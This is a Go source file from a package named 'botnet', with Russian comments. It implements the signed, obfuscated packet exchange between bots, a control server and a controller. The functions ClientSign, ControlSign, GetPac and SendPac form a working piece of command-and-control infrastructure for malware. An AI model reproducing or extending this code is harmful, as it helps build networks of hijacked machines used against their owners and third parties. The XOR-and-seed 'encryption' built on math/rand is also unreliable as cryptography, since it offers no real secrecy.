package botnet

import (
	"encoding/binary"
	"math/rand"
	"net"
	"strconv"
	"time"
)

//ClientSign - генерация подписи для общения клиент(бот)-сервер
func ClientSign(seed int64, message []byte, lenght int) int64 {
	for i := 0; i < lenght; i++ {
		rand.Seed(seed + int64(message[i]))
		seed = rand.Int63()
		seed ^= 0xca7b07ff
		seed = seed & int64(0x10232145*(i+1))
		seed += rand.Int63() % int64((i+1)*0x2334)
	}
	rand.Seed(seed)
	seed = rand.Int63()
	seed ^= 0xca7b07ff
	return seed
}

//ControlSign - генерация подписи для общения контролер-сервер
func ControlSign(seed int64, message []byte, lenght int) int64 {
	for i := 0; i < lenght; i++ {
		rand.Seed(seed + int64(message[i]))
		seed = rand.Int63()
		seed ^= 0xdeadbeef
	}
	rand.Seed(seed)
	seed = rand.Int63()
	seed ^= 0xdeadbeef
	return seed
}

//GetPac - принять пакет, расшифровать и проверить его подпись
func GetPac(conn net.Conn, seed int64, timeout int, signfunc func(int64, []byte, int) int64) ([]byte, int64) {
	res := make(chan int)
	result := make([]byte, 0)
	buftimer := time.NewTimer(time.Duration(timeout) * time.Second)
	go func(ch chan int) {

		readBuf := make([]byte, 1024*1024)
		lenght, _ := conn.Read(readBuf)
		key := make([]byte, 16)
		binary.PutVarint(key, seed)
		seed = signfunc(seed, readBuf[16:], lenght-16)
		seedofread, _ := binary.Varint(readBuf[0:16])
		conn.Write([]byte("@"))
		if seedofread != seed {
			conn.Close()
			result = []byte("Seed error " + strconv.FormatInt(seedofread, 10) + " " + strconv.FormatInt(seed, 10) + "\n")
		} else {
			for i := 16; i < lenght; i++ {
				b := i - 16
				result = append(result, (key[b%8]^readBuf[i])+byte(b+1)*(key[b%3]+key[b%5]))
			}
		}
		ch <- 1
	}(res)
	select {
	case <-buftimer.C:
		conn.Close()
		return []byte("Timeout error \n"), seed
	case <-res:
		if !buftimer.Stop() {
			<-buftimer.C
		}
		return result, seed
	}
}

//SendPac - отправить пакет, зашифровать и подписать его
func SendPac(conn net.Conn, message []byte, seed int64, signfunc func(int64, []byte, int) int64) int64 {
	key := make([]byte, 16)

	binary.PutVarint(key, seed)
	for i := 0; i < len(message); i++ {
		message[i] -= byte(i+1) * (key[i%3] + key[i%5])
		message[i] ^= key[i%8]
	}
	seed = signfunc(seed, message, len(message))
	key = make([]byte, 16)
	binary.PutVarint(key, seed)
	conn.Write([]byte(string(key) + string(message)))
	conn.Read(key) //@
	return seed
}
